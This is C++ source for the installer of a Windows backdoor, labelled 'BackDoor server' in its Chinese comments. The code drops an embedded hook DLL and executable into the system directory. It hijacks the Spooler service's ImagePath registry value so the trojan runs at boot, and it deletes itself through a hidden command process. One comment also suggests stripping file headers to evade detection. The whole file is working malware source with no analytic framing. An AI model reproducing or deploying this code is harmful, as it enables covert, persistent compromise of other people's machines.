//////////////////////////////////////////////////////////////////////////
//FileName:	Server	
//Date:		2009-04-07
//REM:		BackDoor服务端
//////////////////////////////////////////////////////////////////////////
#pragma once
#include "resource.h"
#include <Windows.h>
#pragma comment(linker, "/subsystem:windows /entry:main")

//////////////////////////////////////////////////////////////////////////
//宏定义部分
//////////////////////////////////////////////////////////////////////////
#define SERPATH	"SYSTEM\\CurrentControlSet\\Services\\Spooler"
#define FOLDER	"\\NsDoorFolder"
#define DLLNAME	"\\HookLib.dll"
#define SERVER	"\\Server.exe"

//////////////////////////////////////////////////////////////////////////
//函数声明部分
//////////////////////////////////////////////////////////////////////////
//释放DLL和Loader
BOOL Release2File(const char* fname,HRSRC hRsrc);
//创建一个可用的文件夹
BOOL CreateFolder(char* path);
//写注册表实现自启动
BOOL Write2Register(char* fname);
//自删除
BOOL SelfDelete();

int main(void)
{
	char fname[MAX_PATH] = {0};
	char path[MAX_PATH] = {0};

	//创建一个文件夹
	CreateFolder(path);

	//释放DLL和Loader
	memset(fname,0,sizeof(fname));
	memcpy(fname,path,strlen(path));
	strcat(fname,DLLNAME);
	HRSRC hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_DLL1),TEXT("DLL"));
	Release2File(fname,hRsrc);

	memset(fname,0,sizeof(fname));
	memcpy(fname,path,strlen(path));
	strcat(fname,SERVER);
	hRsrc = FindResource(NULL,MAKEINTRESOURCE(IDR_EXE1),TEXT("EXE"));
	Release2File(fname,hRsrc);

	//写注册表实现自启动(Loader）
	Write2Register(fname);

	//自删除
	SelfDelete();
}

//////////////////////////////////////////////////////////////////////////
//释放DLL和Server
//REM:	有一种思路：不释放前几个字节，然后自己填进去MZ头，更具隐蔽性
//////////////////////////////////////////////////////////////////////////
BOOL Release2File(const char* fname,HRSRC hRsrc)
{
	if (hRsrc==NULL)
	{
		return FALSE;
	}

	//获取资源大小
	DWORD dwSize = SizeofResource(NULL,hRsrc);
	if (dwSize==0)
	{
		return FALSE;
	}

	//加载资源
	HGLOBAL	gl = LoadResource(NULL,hRsrc);
	if (gl==NULL)
	{
		return FALSE;
	}

	//锁定资源
	LPVOID lp = LockResource(gl);
	if (lp==NULL)
	{
		return FALSE;
	}

	//为数据分配空间
	LPBYTE p = (LPBYTE)GlobalAlloc(GPTR,dwSize);

	//复制资源数据
	CopyMemory((LPVOID)p,lp,dwSize);

	HANDLE	fp = CreateFile(fname,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,0,NULL);
	int nRet = 0;
	if (fp==INVALID_HANDLE_VALUE)
	{
		nRet = GetLastError();
	}

	DWORD dwWritten;
	if (!WriteFile(fp,(LPVOID)p,dwSize,&dwWritten,NULL))
	{
		return FALSE;
	}

	//关闭句柄
	CloseHandle(fp);
	//释放内存
	FreeResource(gl);

	return TRUE;
}

//////////////////////////////////////////////////////////////////////////
//写注册表实现自启动
//////////////////////////////////////////////////////////////////////////
BOOL Write2Register(char* fname)
{
	//替换系统服务Spooler的执行路径，改为木马路径 
	HKEY hKey = NULL;
	LONG nRet = RegOpenKey(HKEY_LOCAL_MACHINE, SERPATH, &hKey);
	if (nRet!=ERROR_SUCCESS)
	{
		return 0;
	}
	nRet = RegSetValueEx(hKey,"ImagePath",NULL,REG_EXPAND_SZ,(PBYTE)fname,strlen(fname)+1);
	if (nRet!=ERROR_SUCCESS)
	{
		return 0;
	}

	RegCloseKey(hKey); 

	return TRUE; 
}

//////////////////////////////////////////////////////////////////////////
//自删除
//////////////////////////////////////////////////////////////////////////
BOOL SelfDelete()
{
	char	szModule[MAX_PATH];
	char	szComspec[MAX_PATH];
	char	szParams[MAX_PATH];

	//获得此文件名
	if ( GetModuleFileName(0,szModule,MAX_PATH)!=0 && GetShortPathName(szModule,szModule,MAX_PATH)!=0 && GetEnvironmentVariable(TEXT("COMSPEC"),szComspec,MAX_PATH)!=0 )
	{
		//设置命令参数
		lstrcpy(szParams,TEXT(" /c del "));
		lstrcat(szParams,szModule);
		lstrcat(szParams,TEXT(" > nul"));
		lstrcat(szComspec,szParams);

		//填充结构体
		STARTUPINFO	si = {0};
		PROCESS_INFORMATION	pi = {0};
		si.cb = sizeof(si);
		si.dwFlags = STARTF_USESHOWWINDOW;
		si.wShowWindow = SW_HIDE;

		//为程序增加资源分配
		SetPriorityClass(GetCurrentProcess(),REALTIME_PRIORITY_CLASS);
		SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_TIME_CRITICAL);

		//包含命令
		if (CreateProcess(0,szComspec,0,0,0,CREATE_SUSPENDED | DETACHED_PROCESS,0,0,&si,&pi))
		{
			//暂停一直到该程序退出再执行
			SetPriorityClass(pi.hProcess,IDLE_PRIORITY_CLASS);
			SetThreadPriority(pi.hThread,THREAD_PRIORITY_IDLE);

			//以低级别恢复此批处理
			ResumeThread(pi.hThread);

			return TRUE;
		}
		else
		{
			SetPriorityClass(GetCurrentProcess(),NORMAL_PRIORITY_CLASS);
			SetThreadPriority(GetCurrentProcess(),THREAD_PRIORITY_NORMAL);
		}
	}

	return FALSE;
}

//////////////////////////////////////////////////////////////////////////
//创建一个可用的文件夹
//////////////////////////////////////////////////////////////////////////
BOOL CreateFolder(char* path)
{
	memset(path,0,MAX_PATH);
	GetSystemDirectory(path,MAX_PATH);
	strcat(path,FOLDER);
	
	BOOL bRet = FALSE;
	bRet = CreateDirectory(path,NULL);
	if(bRet)
	{
		return bRet;
	}

	memset(path,0,MAX_PATH);
	GetCurrentDirectory(MAX_PATH,path);
	strcat(path,FOLDER);
	bRet = CreateDirectory(path,NULL);
		
	return bRet;
}